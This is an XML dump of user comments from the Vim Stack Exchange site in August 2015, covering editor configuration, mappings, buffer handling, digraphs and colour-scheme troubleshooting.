  <row Id="6059" PostId="4150" Score="0" Text="@Janis Absolutely! But I don't think Vim is a hammer in this instance :-) I would like to know `awk` better and I am grateful for the example, but a) it would be a dubious investment to learn an external tool for something that is well within Vim's purview, and b) your command is actually more complex than the simplest working solution within Vim, especially if I add the 'padding' of invoking `awk` from within Vim as a filter so I can continue editing the text in Vim afterwards." CreationDate="2015-08-03T20:57:47.787" UserId="1306" />
  <row Id="6060" PostId="4155" Score="1" Text="I usually use `execute normal` to get back to command mode with global. One way to avoid lots of ``\`` is to use single quotes `'` instead of double `&quot;` to surround normal, as in `execute 'normal ...'`. See `:help literal-string` vs `:help expr-string` or, more generally, the bottom of section 41.2 on variables `:help 41.2` in the section &quot;STRING VARIABLES AND CONSTANTS&quot; (actually, its quicker to do `:help 41.3` and scroll up a couple pages)" CreationDate="2015-08-04T01:59:14.293" UserId="227" />
  <row Id="6061" PostId="4155" Score="0" Text="Oh, I have misunderstood the paragraph at `:h exe|/nice` to say that I _must_ give control characters in the `\&lt;Esc&gt;` form with the execute command. Since that form won't work in `''` strings, I thought I had to put control characters in expression strings, so, either do extra escapes (`&quot;/^\\S\&lt;CR&gt;&quot;`) or maybe concatenate literal and expression strings (`'/^\S' . &quot;\&lt;CR&gt;&quot;`). I see now that it says 'nice', not 'necessary', and `'/^\S^M'` seems to work just fine. Thanks!" CreationDate="2015-08-04T07:42:04.617" UserId="1306" />
  <row Id="6062" PostId="4167" Score="2" Text="I recommand : https://github.com/Shougo/neocomplete.vim, There is autocompletion for vimscript :)" CreationDate="2015-08-04T09:13:18.630" UserId="1821" />
  <row Id="6063" PostId="4168" Score="0" Text="I can't really answer that, but check `:h colorcolumn`, this is a standard option for vim. The help states &quot;Will make screen redrawing slower.&quot;, so you won't probably get around that, but maybe the internal implementation is atleast faster then your version." CreationDate="2015-08-04T09:32:11.237" UserId="1296" />
  <row Id="6064" PostId="4168" Score="0" Text="with a `set cc=+1` and a `set textwidth=80` I get the 81th column colored with no performance issue, so I'll stick to that for the moment, thanks for the advice" CreationDate="2015-08-04T09:45:22.937" UserId="1821" />
  <row Id="6065" PostId="4161" Score="0" Text="The [README also mentions this](https://github.com/tomasr/molokai): *&quot;256-Color terminals are also supported, though there are some differences with the Gui version.&quot;* ..." CreationDate="2015-08-04T10:12:44.917" UserId="51" />
  <row Id="6066" PostId="3324" Score="0" Text="Note that many terminals allow configuration of the colours they use, so you can use the same shade of red/blue/etc. as gVim uses. You're still limited to 256 colours in total though, and the changes apply to all programs. *Some* terminals also have the concept of &quot;profiles&quot;, so you may be able to create a &quot;Vim profile&quot; for those terminals." CreationDate="2015-08-04T10:14:49.097" UserId="51" />
  <row Id="6067" PostId="4167" Score="1" Text="I'm not sure what exactly are you asking for. YouCompleteMe does autocomplete vimscript key words. Are you asking for autocomplete plugin written entirely in vimscript?&#xA;&#xA;Also I believe that vimscript autocompletion is builtin in the omnicompletion." CreationDate="2015-08-04T11:19:43.937" UserId="428" />
  <row Id="6068" PostId="4170" Score="0" Text="If your problem is that your mappings move the cursor why don't you do `nnoremap &lt;Leader&gt;d kddj` and `nnoremap &lt;Leader&gt;D jddk`?" CreationDate="2015-08-04T12:00:04.337" UserId="1841" />
  <row Id="6069" PostId="4170" Score="0" Text="Using either `kddj` or `jddk`, column position is not preserved. I'm not saying it's a big problem, but it's annoying.&#xA;&#xA;For the record, `kddj` moves cursor 1 line below original position. And `jdd-` seems like a better alternative to `jddk` because at least I'm returning to first non white space character. If line below the one I want deleted is empty, I'm left at the beginning of the line." CreationDate="2015-08-04T12:04:49.643" UserId="1733" />
  <row Id="6070" PostId="4170" Score="0" Text="How about using makdd`a for your map? Sets a mark and returns to it afterwards... you might want to change it to a lesser used character though." CreationDate="2015-08-04T12:17:52.940" UserId="1296" />
  <row Id="6072" PostId="4150" Score="0" Text="Don't get me wrong; vim is great! - Where I have my reservations, though, is when it comes to implementing non-standard vim-script solutions, where even the very powerful vi/vim-base can't solve the issue. - From your point (b) I get the impression that you want to do everything from **built-ins** within vim - I think this is (in case of complex tasks) not appropriate (YMMV). The solution (IMO) is to use the existing (or new) external tool(s) and apply vi/vim's `!G` command. - WRT learning new things; it's your choice whether you learn vim-specifics or a (POSIX) standard tool." CreationDate="2015-08-04T13:30:40.983" UserId="2479" />
  <row Id="6073" PostId="4172" Score="0" Text="1. One of tons articles: http://www.alexeyshmalko.com/2014/using-vim-as-c-cpp-ide/&#xA;2. `set makeprg=make\ -f\ ring_buffer.makefile`" CreationDate="2015-08-04T14:27:57.203" UserId="1145" />
  <row Id="6074" PostId="4163" Score="1" Text="When moving from programming language &quot;A&quot; to &quot;B&quot;. It is best **not** to write &quot;B&quot; in the style of &quot;A&quot; but rather learn the standard idioms of &quot;B&quot; (its a hard lesson for most developers). Same rule applies for editors. Don't try and apply the standard workflow of editor &quot;A&quot; to your new editor &quot;B&quot;. Prefer to learn the idioms of using &quot;B&quot; directly. Bigger learning curve but much more productive in the long run. In `vim` when editing you spend most of your time in normal mode not in insert mode." CreationDate="2015-08-04T14:34:48.923" UserId="383" />
  <row Id="6075" PostId="4172" Score="0" Text="What is the purpose of the '\' char after each option?" CreationDate="2015-08-04T15:00:54.220" UserId="3050" />
  <row Id="6076" PostId="4172" Score="0" Text="`\ ` is a escaped space symbol. See `:he makeprg` for examples and explanations." CreationDate="2015-08-04T15:02:53.150" UserId="1145" />
  <row Id="6077" PostId="4172" Score="0" Text="Thank you.  Actually I did read the help, but being so new to VIM, it is hard to understand.  Things that you advanced users take for granted are sometimes a mystery to a beginner like me." CreationDate="2015-08-04T15:24:53.810" UserId="3050" />
  <row Id="6078" PostId="4174" Score="0" Text="OP mentioned that he already tried YCM. You mentioned ultisnips which isn't an autocompletion plugin but snippets plugin which contains like 3 vimscript related snippets." CreationDate="2015-08-04T15:31:50.503" UserId="428" />
  <row Id="6079" PostId="4172" Score="0" Text="If I wanted to add error window `:copen`, I tried the follwoing: `set makeprg=make\ -f\ ring_buffer.makefile | copen`, but it still goes to the terminal.  Any way to prevent it from flashing the terminal?" CreationDate="2015-08-04T15:58:20.630" UserId="3050" />
  <row Id="6080" PostId="4172" Score="0" Text="Note: `:make` executes make program which you set with `set makeprg` and opens window with errors. `:!make` fires up your shell and make inside it. You shouldn't pipes outputs to copen with `set makeprg`." CreationDate="2015-08-04T16:35:28.023" UserId="1145" />
  <row Id="6081" PostId="4172" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/26587/discussion-between-user1135541-and-alex-kroll)." CreationDate="2015-08-04T17:30:37.403" UserId="3050" />
  <row Id="6082" PostId="4167" Score="0" Text="maybe it is not clear, i want something that gives me all the vimscript functions like when I write somethin in vimscript, it autocompletes like the internal join function or *bpre* and it suggests bprevious like i have when i write an ex-command.&#xA;&#xA;Somethink like   autocmd FileType vim set omnifunc=????????" CreationDate="2015-08-04T18:53:32.540" UserId="3003" />
  <row Id="6083" PostId="4167" Score="0" Text="But that's exactly what YCM does: https://asciinema.org/a/1c2gyfpft51rnoptt86bjvvwr&#xA;&#xA;This is youcompleteme running in vim 7.3.&#xA;&#xA;You stated that you have YCM installed. Are you not happy with it and looking for something else or does it not work for you?" CreationDate="2015-08-04T22:03:43.443" UserId="428" />
  <row Id="6084" PostId="4148" Score="0" Text="You could also like https://github.com/sk1418/Join (not tested)." CreationDate="2015-08-04T22:47:38.823" UserId="1800" />
  <row Id="6085" PostId="4149" Score="0" Text="2nd update; at this point it just became a &quot;create an interactive operator with count and repeat support&quot; exercise for myself." CreationDate="2015-08-04T22:50:21.530" UserId="1800" />
  <row Id="6086" PostId="4173" Score="1" Text="That still moves the cursor, though." CreationDate="2015-08-05T06:27:29.350" UserId="1296" />
  <row Id="6087" PostId="4173" Score="1" Text="You can't avoid moving the cursor. The best you can do is move the cursor *and move it back*." CreationDate="2015-08-05T07:51:31.877" UserId="54" />
  <row Id="6088" PostId="4173" Score="0" Text="Thank you! This kind of &quot;vim way&quot; is what I was looking for. I'm going to use this in combination with `` to get the cursor back where it was." CreationDate="2015-08-05T08:44:31.730" UserId="1733" />
  <row Id="6089" PostId="4170" Score="0" Text="@PhilippFrank Or I can use `` to get the cursor back and not occupy a register (not that I use any :) )." CreationDate="2015-08-05T08:46:25.203" UserId="1733" />
  <row Id="6090" PostId="4171" Score="0" Text="Thank you for the effort. If there had not been &quot;in-vim&quot; way of doing it with `-d`, this is how I imagined it could work." CreationDate="2015-08-05T08:47:48.853" UserId="1733" />
  <row Id="6091" PostId="4171" Score="0" Text="You're welcome :-)" CreationDate="2015-08-05T08:50:10.920" UserId="1841" />
  <row Id="6092" PostId="4170" Score="0" Text="No that doesn't work, k is not a jump, so you cannot go back using ``." CreationDate="2015-08-05T09:15:35.747" UserId="1296" />
  <row Id="6093" PostId="4170" Score="0" Text="You're right. I was trying `` with `:-d`, not with `kdd`." CreationDate="2015-08-05T09:18:57.400" UserId="1733" />
  <row Id="6094" PostId="4170" Score="0" Text="And :-d induces a jump? Interesting, I did not know that. Thanks!" CreationDate="2015-08-05T09:25:15.870" UserId="1296" />
  <row Id="6095" PostId="4181" Score="0" Text="Why not a simple download ?" CreationDate="2015-08-05T16:15:42.703" UserId="54" />
  <row Id="6096" PostId="4181" Score="0" Text="@romainl What do you mean by &quot;simple download&quot;?" CreationDate="2015-08-05T17:05:50.047" UserId="3064" />
  <row Id="6097" PostId="4182" Score="3" Text="Using `set autoread` sort of does this, but has limitations. See [my answer here](http://vi.stackexchange.com/a/2731/51), which also includes a possible solution." CreationDate="2015-08-05T18:08:52.890" UserId="51" />
  <row Id="6098" PostId="4181" Score="0" Text="Well, you download [the latest snapshot](https://github.com/macvim-dev/macvim/releases), you install it like any other application and you go back to work." CreationDate="2015-08-05T18:08:56.927" UserId="54" />
  <row Id="6099" PostId="4182" Score="0" Text="Also very similar to: [How can I have vim automatically notify me when a file that I am editing changes?](http://vi.stackexchange.com/q/2709/51)" CreationDate="2015-08-05T18:12:02.070" UserId="51" />
  <row Id="6101" PostId="4149" Score="1" Text="If `l:sep` is an `&amp;`, then your replacement will work incorrectly, since `&amp;` is magic in the replacement.  Might be better to use the `\=` to use a literal string -- `let l:subst = 's/\n\+/\=' . &quot;'&quot; . l:sep . &quot;'/&quot;` -- instead of trying to handle escaping." CreationDate="2015-08-05T20:29:48.057" UserId="15" />
  <row Id="6102" PostId="4149" Score="0" Text="@jamessan - Thanks, this is good stuff, edited :)" CreationDate="2015-08-05T20:47:29.587" UserId="1800" />
  <row Id="6103" PostId="4184" Score="0" Text="`:syntax match Error &quot;ur_term&quot;` works. However, how to make it case insensitive? Thanks." CreationDate="2015-08-05T22:18:10.773" UserId="1080" />
  <row Id="6105" PostId="4181" Score="0" Text="@romainl Done exactly that, as stated in question about github &quot;releases&quot; section. Clicking on MacVim icon in &quot;Applications&quot; starts it, but Terminal.app is also started alongside with it." CreationDate="2015-08-06T06:54:36.460" UserId="3064" />
  <row Id="6106" PostId="4185" Score="5" Text="Have you read the corresponding doc at `:h UltiSnips-snippet-search-path`? It precises that your directory `UltiSnipsNewDir` must be a sub directory of one of them defined in `runtimepath`, is your new directory placed in the right place?" CreationDate="2015-08-06T08:21:03.163" UserId="1841" />
  <row Id="6107" PostId="4186" Score="2" Text="This is not possible without some serious hackery, and also not really desirable, the definition of a &quot;line&quot; is 0 or more characters ended by a newline, if you change that definition, you change *a lot* in Vim. For example, what would you expect `,3s/A/B/` to do? Use the next 3 lines? Or the next 3 &quot;wrapped lines&quot;? I understand why you're asking this, but I think your proposed 'solution' will cause you more problems than you will solve." CreationDate="2015-08-06T08:32:22.283" UserId="51" />
  <row Id="6109" PostId="4184" Score="0" Text="Updated answer accordingly (`\c` flag)." CreationDate="2015-08-06T08:49:22.800" UserId="1800" />
  <row Id="6110" PostId="4186" Score="0" Text="Perhaps consider (automatically) hardwrapping your lines: if you edit in markdown, or LaTeX, there's no difference; and you can also `J`oin lines at any time. You get all the benefits, with none of the disadvantages." CreationDate="2015-08-06T09:02:01.333" UserId="1800" />
  <row Id="6112" PostId="4131" Score="0" Text="There are some sugestion is this [two](http://stackoverflow.com/questions/21277806/fatal-early-eof-fatal-index-pack-failed) [questions](http://stackoverflow.com/questions/1943914/git-clone-fails-with-index-pack-failed) on SE ." CreationDate="2015-08-06T12:15:48.223" UserId="1453" />
  <row Id="6113" PostId="4187" Score="2" Text="I don't reproduce your error, can you try with `set hidden` ?" CreationDate="2015-08-06T13:10:25.400" UserId="1821" />
  <row Id="6114" PostId="4187" Score="0" Text="With `hidden` enabled it works." CreationDate="2015-08-06T13:12:16.990" UserId="1066" />
  <row Id="6115" PostId="4191" Score="0" Text="I find it strange though. Since the operation I want to run is writing the buffer, I would expect that vim attempts to do that first, before switching to the next buffer." CreationDate="2015-08-06T13:16:35.400" UserId="1066" />
  <row Id="6116" PostId="4191" Score="0" Text="You should really look at `:h hidden` ;) I quote &quot;The commands that move through the buffer list sometimes make a buffer hidden although the 'hidden' option is off ...&quot;" CreationDate="2015-08-06T13:17:39.010" UserId="1821" />
  <row Id="6117" PostId="4191" Score="0" Text="I read it, but I don't understand how it relates." CreationDate="2015-08-06T13:54:47.520" UserId="1066" />
  <row Id="6118" PostId="4191" Score="2" Text="I think that when you enter `:bufdo w`, vim first switchs to the first buffer to write it, then, go to the second one and write it, and so on.. So your current buffer becomes hidden, which is forbidden without setting the `hidden` option." CreationDate="2015-08-06T13:57:42.100" UserId="1821" />
  <row Id="6119" PostId="4186" Score="0" Text="Thanks for both comments. I see your point carpetsmoker although I wish it were different. True, vanlaser but other languages aren't so kind and oftentimes I only want to sometimes see the end of the line (ie huge JavaScript arrays)" CreationDate="2015-08-06T14:27:28.710" UserId="217" />
  <row Id="6120" PostId="4191" Score="0" Text="Okay, that sounds reasonable. Not sure if I'm the only one, but I rarely find it trivial to understand vim's documentation when it comes to non-obvious features." CreationDate="2015-08-06T14:44:01.560" UserId="1066" />
  <row Id="6121" PostId="4190" Score="1" Text="This is not how Vim behaves for me (and I can't recall ever seeing this behaviour). Either something in the vimrc, or the filetype you're using is causing this." CreationDate="2015-08-06T14:58:40.970" UserId="51" />
  <row Id="6122" PostId="4190" Score="0" Text="Do you know what options I can see to 'debug' this ?" CreationDate="2015-08-06T14:59:19.310" UserId="1821" />
  <row Id="6123" PostId="4190" Score="1" Text="You can try the steps in [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51)" CreationDate="2015-08-06T14:59:57.157" UserId="51" />
  <row Id="6124" PostId="4190" Score="0" Text="great, I'll update my post if I get something new, thanks" CreationDate="2015-08-06T15:00:57.073" UserId="1821" />
  <row Id="6125" PostId="4187" Score="0" Text="My guess is, your current buffer is modified. And when doing :bufdo, Vim first tries to go to the first buffer, which isn't allowed, unless you set hidden or write the current buffer first." CreationDate="2015-08-06T20:52:25.070" UserId="71" />
  <row Id="6126" PostId="4191" Score="0" Text="@Nobe4 @oarfish In fact, if you do `:help bufdo` it shows that it works as `:bfirst` `:{cmd}` `:bnext` `{cmd}` etc. which confirms what you are seeing :-)" CreationDate="2015-08-07T02:14:14.400" UserId="227" />
  <row Id="6127" PostId="4191" Score="0" Text="If you're finding the need to write all buffers, I'm guessing you're already using some `!`s in your edit / file navigation commands. It would be appropriate to follow that pattern, using `:bufdo! write`. However, for reasons unrelated to this problem, I'd still highly recommend setting `'hidden'`." CreationDate="2015-08-07T03:36:09.133" UserId="64" />
  <row Id="6128" PostId="4191" Score="0" Text="Another possibility is that you have modified buffers open in tabs or splits, but no actual modified hidden buffers. For that scenario, `:tabdo` and `:windo` could come in handy (and they can be combined!)." CreationDate="2015-08-07T03:39:20.780" UserId="64" />
  <row Id="6129" PostId="4192" Score="0" Text="for my application (sizing for small files to get their windows to auto-size upon opening) i actually can use `gj` in a loop to scan the height. it's very very ugly, but it will not be slow because i will always terminate it within 200 steps" CreationDate="2015-08-07T04:17:20.323" UserId="390" />
  <row Id="6131" PostId="4192" Score="2" Text="Don't count (pun!) too much on any number of wrapped lines you may find, as it will change if you modify a Vim setting such as `showbreak`, `number` (with `relativenumber`), `foldcolumn` (or when using signs)." CreationDate="2015-08-07T07:13:50.287" UserId="1800" />
  <row Id="6132" PostId="4190" Score="0" Text="Maybe it has something to see with your `formatoptions`? What's the result of `set fo?` on your system?" CreationDate="2015-08-07T08:06:08.800" UserId="1841" />
  <row Id="6133" PostId="4190" Score="0" Text="@statox With my vimrc : `formatoptions=tcq` and without : `=tcqln`&#xA;@Carpetsmoker : it clearly come from an option in my vimrc, thanks for the advice again." CreationDate="2015-08-07T08:09:58.810" UserId="1821" />
  <row Id="6134" PostId="4190" Score="0" Text="That's the default value so probably not the source of the problem. Btw `:h fo-table` indicates that the option `l` is `Long lines are not broken in insert mode: When a line was longer than 'textwidth' when the insert command started, Vim does not automatically format it.` but as I said that might not be relevant)" CreationDate="2015-08-07T08:14:54.047" UserId="1841" />
  <row Id="6135" PostId="4190" Score="0" Text="@statox: yup exactly, removing the `l` flag solved the issue." CreationDate="2015-08-07T08:16:19.567" UserId="1821" />
  <row Id="6136" PostId="4194" Score="0" Text="I don't think that `formatoptions` and paste mode disable insert mode mappings, or I'd be interested to see the relevant documentation." CreationDate="2015-08-07T08:32:32.987" UserId="1841" />
  <row Id="6137" PostId="4194" Score="0" Text="Only paste mode disables mappings while it is on. Sorry if my writing was unclear." CreationDate="2015-08-07T08:38:26.020" UserId="2283" />
  <row Id="6138" PostId="4194" Score="0" Text="For `paste` - `:h 'paste'`: &quot;[...] 	When the 'paste' option is switched on (also when it was already on): - mapping in Insert mode and Command-line mode is disabled [...]&quot;" CreationDate="2015-08-07T08:38:32.013" UserId="1800" />
  <row Id="6139" PostId="4194" Score="0" Text="@ZeroKelvinKeyboard: No problem maybe it my reading which was unclear ;-) And thanks @ VanLaser for the doc!" CreationDate="2015-08-07T08:42:38.373" UserId="1841" />
  <row Id="6140" PostId="4194" Score="0" Text="@statox -you're welcome :) And I only found out about it while dealing with undo: http://vi.stackexchange.com/a/3865/1800 (in comments)" CreationDate="2015-08-07T08:51:52.633" UserId="1800" />
  <row Id="6141" PostId="4197" Score="0" Text="Perhaps &lt;Tab&gt; is not so special, after all ... (it's equivalent to `&lt;C-I&gt;`, so you actually insert `&lt;C-K&gt;&lt;C-I&gt;`. &lt;S-Tab&gt; works btw." CreationDate="2015-08-07T10:46:40.063" UserId="1800" />
  <row Id="6142" PostId="4197" Score="0" Text="I probably should have specified: nothing works in my config. Not `&lt;Tab&gt;` nor `&lt;S-Tab&gt;`, nor the example provided in the docs. I'm definitely missing something." CreationDate="2015-08-07T10:52:46.357" UserId="3079" />
  <row Id="6143" PostId="4197" Score="0" Text="Try `ctrl-k` `up arrow`, does that work? Perhaps add your OS, vim/gvim build details etc. to the post. And `S` is Shift (just to be sure)." CreationDate="2015-08-07T11:00:13.397" UserId="1800" />
  <row Id="6144" PostId="4197" Score="0" Text="I got it partially working by enabling the `digraph` option in my vimrc. Now the arrow keys show up properly, as does `&lt;S-Tab&gt;`. The example in the docs, `&lt;S-Space&gt;` still doesn't show up, nor do other common chords like `&lt;C-W&gt;` or `&lt;C-H&gt;`. Updating my question with more details." CreationDate="2015-08-07T11:13:54.507" UserId="3079" />
  <row Id="6145" PostId="4198" Score="1" Text="I see, thank you for clearing things up for me. That's pretty poorly documented though. I've found mention of this feature in `ins-special-keys`, a section that lists all the chars that have a special meaning in insert mode, including `&lt;C-K&gt;` for digraphs. I wasn't expecting there was another section just a little further ahead named `ins-special-special` listing special *special* characters, and that those are the only ones you can have literally printed in digraph mode. A quick headsup and an hyperref linking the two sections in the docs would be a good thing." CreationDate="2015-08-07T12:21:31.860" UserId="3079" />
  <row Id="6147" PostId="4196" Score="2" Text="Rather than use the function to do this, you could use `:global` with the pattern and the command `norm I&gt;&gt;&gt;`. The whole command would be `:g/[-+*/%()]\|import/norm I&gt;&gt;&gt;`." CreationDate="2015-08-07T12:36:09.067" UserId="1672" />
  <row Id="6148" PostId="4198" Score="0" Text="Indeed, it's almost like the 2nd *special* was added at a later time." CreationDate="2015-08-07T13:00:34.127" UserId="1800" />
  <row Id="6149" PostId="4104" Score="0" Text="You example `syntax` command seems to work, as it is in the answer. The word `*ratchet` gets highlighted as a keyword (brown-isn in my case), and the tab just before it is also highlighted (which is only visible when you move the cursor over it). How did you try to apply the `:syntax` rule?" CreationDate="2015-08-07T13:13:05.743" UserId="51" />
  <row Id="6150" PostId="4196" Score="0" Text="@SakariCajanus, That sounds good, but I need something that I can reuse easily." CreationDate="2015-08-07T13:17:25.920" UserId="3085" />
  <row Id="6151" PostId="4210" Score="0" Text="Using `redir @n` will clobber the `@n` register. Why not use a local variable with `redir =&gt; ls_output`? IMHO scripts/functions should never cause side-effects such as clobbering registers unless that's what they're designed to do." CreationDate="2015-08-07T13:52:02.747" UserId="51" />
  <row Id="6152" PostId="4165" Score="0" Text="In addition to [`:h ins-special-keys`](http://vimdoc.sourceforge.net/htmldoc/insert.html#ins-special-keys), check out [`:h ins-special-special`](http://vimdoc.sourceforge.net/htmldoc/insert.html#ins-special-special) for more mappings." CreationDate="2015-08-07T14:09:19.400" UserId="2680" />
  <row Id="6153" PostId="4210" Score="0" Text="@Carpetsmoker you're right I updated my answer. Thanks for your comment! :-)" CreationDate="2015-08-07T14:09:43.790" UserId="1841" />
  <row Id="6154" PostId="4184" Score="0" Text="I remember a colour scheme specifically designed for printing, from a few years ago.  Not sure what happened to it though.  Personally I'm using `a2ps` for printing code, it fills the bill pretty well." CreationDate="2015-08-08T05:30:12.323" UserId="2313" />
  <row Id="6155" PostId="4211" Score="4" Text="If you value your sanity, it's a good idea to give up on end line comments entirely.  `&quot;` is used as both a string delimiter and a comment character, and thus its exact meaning depends on the context.  Now, this wouldn't be a problem in a normal language.  However, VimL is weird at best.  End line comments can create problems that are really hard to debug." CreationDate="2015-08-08T11:16:38.587" UserId="2313" />
  <row Id="6156" PostId="4122" Score="0" Text="This should also work in Vim 7.4. Are you sure that you have the `autoread` option set?" CreationDate="2015-08-08T11:27:26.960" UserId="51" />
  <row Id="6157" PostId="4227" Score="1" Text="The code for this can be found in the `ex_filetype()` function in `src/ex_docmd.c`. There doesn't seem to be a lot of magic going on." CreationDate="2015-08-08T12:32:13.903" UserId="51" />
  <row Id="6158" PostId="4212" Score="0" Text="The answer to (1) is indeed that you can't in Vim (IIRC it's planned for Neovim). But you can in some terminal emulators: see the second half of http://vi.stackexchange.com/questions/3225/disable-esc-but-keep-c/3570#3570. What terminal emulator do you use? (If you use GVim, you're back to “sucker”.)" CreationDate="2015-08-08T12:43:40.870" UserId="8" />
  <row Id="6159" PostId="4212" Score="0" Text="@Gilles I'm actually using Neovim (git HEAD version) in a tmux session in Termite (a VTE based terminal)." CreationDate="2015-08-08T13:08:23.307" UserId="267" />
  <row Id="6160" PostId="4212" Score="0" Text="VTE? Nope, [sucker](http://unix.stackexchange.com/questions/191527/bash-wrong-key-sequence-bindings-with-controlaltspace/191710#191710)." CreationDate="2015-08-08T13:10:32.130" UserId="8" />
  <row Id="6161" PostId="4184" Score="0" Text="This one could be used for B/W printing, I think: https://github.com/plan9-for-vimspace/acme-colors" CreationDate="2015-08-08T16:25:13.123" UserId="1800" />
  <row Id="6162" PostId="4196" Score="0" Text="The first thought I had when reading your question was that all you need is a global substitution. Similar to Sakari's approach but without vim's specific *norm*, e.g.: `:g/[-+*/%()]\|import/s/^/&gt;&gt;&gt;/`. (And yes, you can reuse that command as well, you don't need a complex function.)" CreationDate="2015-08-08T17:31:15.847" UserId="2479" />
  <row Id="6163" PostId="3819" Score="0" Text="Does goto definition work? That's the smoke test to see if the server is working properly." CreationDate="2015-08-08T21:22:09.920" UserId="3097" />
  <row Id="6164" PostId="4232" Score="0" Text="`sudo echo $TERM` will always print the same value as `echo $TERM` - the variable is expanded before `sudo` comes into play. What does `sudo $SHELL -c 'echo $TERM'` say? How did you install the colour scene? And you should use `sudoedit` instead of `sudo vim`." CreationDate="2015-08-08T21:36:22.563" UserId="205" />
  <row Id="6165" PostId="4137" Score="0" Text="See also @Gilles answer here: http://vi.stackexchange.com/questions/3225/disable-esc-but-keep-c/3570#3570  (didn't see his answer when I posted this one, but covers much the same info and is better formatted and has better details)" CreationDate="2015-08-09T02:59:01.180" UserId="227" />
  <row Id="6166" PostId="4232" Score="0" Text="maybe as a sudo its not loading the right vimrc? Try &quot;source &lt;pathtoyourvimrc&gt;&quot;." CreationDate="2015-08-09T06:54:09.667" UserId="3003" />
  <row Id="6167" PostId="4232" Score="0" Text="@muru `sudo $SHELL -c 'echo $TERM'` gives me the same value of &quot;screen-256color&quot;. I installed the colorscheme by copying `jellybeans.vim` file into the folder `/usr/share/vim/vim74/colors`. Thank you for `sudoedit` tip." CreationDate="2015-08-09T09:30:12.290" UserId="1067" />
  <row Id="6168" PostId="4234" Score="0" Text="I don't hink only root .vimrc file is used when running `sudo vim`. Just now i deleted root's .vimrc file and my keys/plugins defined in my user's .vimrc still work when running `sudo vim`. (when i log as root first and then run vim, they don't work). When i run `scriptnames` i see `jeelybeans.vim` only with `sudo vim` not with `vim`." CreationDate="2015-08-09T09:48:42.220" UserId="1067" />
  <row Id="6169" PostId="4232" Score="1" Text="@philolo1 i think `sudo vim` loads my local .vimrc because i deleted root's .vimrc and all my plugins/keys work as the should. I tried `source /home/kossak/.vimrc` but it doesn't change anything." CreationDate="2015-08-09T09:53:02.150" UserId="1067" />
  <row Id="6170" PostId="4234" Score="0" Text="this `:scriptnames` led me to solution - `jellybeans.vim` file was lacking read permission for &quot;others&quot;. Modify your answer so i can mark it as solution. Thank you :)" CreationDate="2015-08-09T09:56:15.503" UserId="1067" />
  <row Id="6171" PostId="4235" Score="1" Text="you can use `:wa` to make sure there aren't any unsaved files." CreationDate="2015-08-09T14:06:15.873" UserId="342" />
  <row Id="6172" PostId="4235" Score="2" Text="really, it's much &quot;saner&quot; to make sure all your files are saved before you `git commit` ..." CreationDate="2015-08-09T16:29:53.473" UserId="1800" />
  <row Id="6173" PostId="4234" Score="0" Text="Thank you, but I don't think my answer was the solution. In fact, after reading your solution and re-reading your question, I see that I misunderstood your question." CreationDate="2015-08-09T17:09:16.280" UserId="2055" />
  <row Id="6174" PostId="4241" Score="0" Text="Did you noticed that, when you remove the `&lt;leader&gt;` from the mapping, you have no problem calling the function at the right column ? While digging, I yet found nothing about your problem though ..." CreationDate="2015-08-09T22:22:20.920" UserId="1821" />
  <row Id="6175" PostId="4241" Score="0" Text="Also, what do you expect to achieve while calling your function with a range ?" CreationDate="2015-08-09T22:29:53.093" UserId="1821" />
  <row Id="6176" PostId="4241" Score="0" Text="See `:h func-range`. By using `range`, the function will be called *only once*." CreationDate="2015-08-09T22:51:29.447" UserId="1800" />
  <row Id="6178" PostId="4242" Score="1" Text="... but, you're right about `:2call TestCursor...` - I can solve it by using `:&lt;C-u&gt;call TestCursor ...&gt;` (edited your answer a little)." CreationDate="2015-08-09T22:57:21.690" UserId="1800" />
  <row Id="6179" PostId="4243" Score="1" Text="Can you expand on the trick by summarizing the link? A plain link is not very useful if the site goes down or dies." CreationDate="2015-08-10T02:18:01.593" UserId="205" />
  <row Id="6180" PostId="4231" Score="0" Text="I'll try this solution too. For the moment I'm giving a try to ctrl-space mentionned by VanLaser in the comment, which is pretty good. I'll see which solution is the most convenient. Also +1 for the altercmd plugin which is pretty cool!" CreationDate="2015-08-10T08:09:41.137" UserId="1841" />
  <row Id="6181" PostId="4244" Score="1" Text="Because they are evil and enjoy messing things up?" CreationDate="2015-08-10T08:10:06.703" UserId="622" />
  <row Id="6182" PostId="4240" Score="0" Text="Indeed VanLaser mentionned it in the comments and I didn't look at it close enough at first but it seems to be really good, I've been trying it for a few days now." CreationDate="2015-08-10T08:11:03.420" UserId="1841" />
  <row Id="6183" PostId="4245" Score="0" Text="Record a macro in a register, with `q`. Then, paste the register content to a file. `:h -w` hints to the `complex-repeat` section, which actually describes the Vim macro system. In general, you read `:h starting.txt` and hope to find there and indication to the corresponding `vimrc` option :)" CreationDate="2015-08-10T11:54:12.753" UserId="1800" />
  <row Id="6184" PostId="4245" Score="0" Text="Hello, I saw this it could be a workaround but I don't find it satisfying... Meanwhile I updated my question to make it more generic" CreationDate="2015-08-10T11:56:33.343" UserId="1821" />
  <row Id="6185" PostId="4245" Score="4" Text="As far as I know, you can't. But you can create a shell alias, which has *roughly* the same effect." CreationDate="2015-08-10T12:05:19.680" UserId="51" />
  <row Id="6186" PostId="4245" Score="0" Text="I didn't wanted to do so ... but I might find that I have no other choice ... What do you think about creating a script that would reload vim with appropriated flags ?" CreationDate="2015-08-10T12:06:09.700" UserId="1821" />
  <row Id="6187" PostId="4232" Score="0" Text="Please don't add solutions to your answer. Mark your answer as accepted. There might be a timeout, but you can accept your own answers." CreationDate="2015-08-10T12:56:39.813" UserId="205" />
  <row Id="6188" PostId="4233" Score="0" Text="I'm not sure to really see what you're trying to do but have you tried to put this line in your vimrc `let python_highlight_all = 1`? Also for enhanced python highlightinh see [here](http://www.vim.org/scripts/script.php?script_id=790)" CreationDate="2015-08-10T13:14:14.627" UserId="1841" />
  <row Id="6189" PostId="4245" Score="1" Text="I'm not sure if that's possible from Vim. You can use `!` and `system()`, but both will leave the original process in place (it doesn't replace the original Vim process). You could do it with a wrapper shell script of course, but that doesn't seem easier than a shell alias." CreationDate="2015-08-10T13:27:22.757" UserId="51" />
  <row Id="6190" PostId="4245" Score="0" Text="Imagine a program that, when started with the `-s` flag, acts as a server, and, without it, will start as a client. It is not *necessary* that the program would always be written in such a way that the client could become a server, or viceversa, *while running*." CreationDate="2015-08-10T13:57:06.763" UserId="1800" />
